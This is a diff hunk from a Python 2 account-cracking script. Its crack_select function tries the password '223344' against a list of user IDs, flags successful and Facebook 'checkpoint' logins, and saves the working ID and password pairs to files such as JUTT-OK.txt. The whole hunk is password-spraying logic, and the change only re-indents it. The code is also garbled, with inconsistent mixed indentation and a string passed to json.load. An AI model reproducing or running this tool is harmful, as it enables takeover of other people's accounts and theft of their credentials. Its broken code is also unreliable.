@@ -438,21 +438,21 @@ def crack_select():
 										cp.write(uid + "|" + pass6 + "\n")
 										cp.close()
 										cps.append(uid + pass6)
-									else:
-										pass7 = '223344'
-										data = requests.get('https://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
-										q = json.load(data)
-										if 'loq' in q:
-											print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + uid + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-                                                                                        ok = open('/sdcard/ids/JUTT-OK.txt', 'a')
-                                                                                        ok.write(uid + ' | ' + pass7 + '\n')
-											oks.append(uid + pass7)
-										elif 'www.facebook.com' in q["error_msg"]:
-											        print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + uid + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-												cp = open('JUTT-CP.txt', 'a')
-												cp.write(uid + "|" + pass7 +"\n")
-												cp.close()
-												cps.append(uid+pass7)
+								else:
+									pass7 = '223344'
+									data = requests.get('https://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
+									q = json.load(data)
+									if 'loq' in q:
+										print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + uid + ' \x1b[1;96m|\x1b[1;97m ' + pass7
+                                                                                ok = open('/sdcard/ids/JUTT-OK.txt', 'a')
+                                                                                ok.write(uid + ' | ' + pass7 + '\n')
+									        oks.append(uid + pass7)
+									elif 'www.facebook.com' in q["error_msg"]:
+								                print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + uid + ' \x1b[1;96m|\x1b[1;97m ' + pass7
+										cp = open('JUTT-CP.txt', 'a')
+										cp.write(uid + "|" + pass7 +"\n")
+										cp.close()
+										cps.append(uid+pass7)
 													                             
 															
 		except:
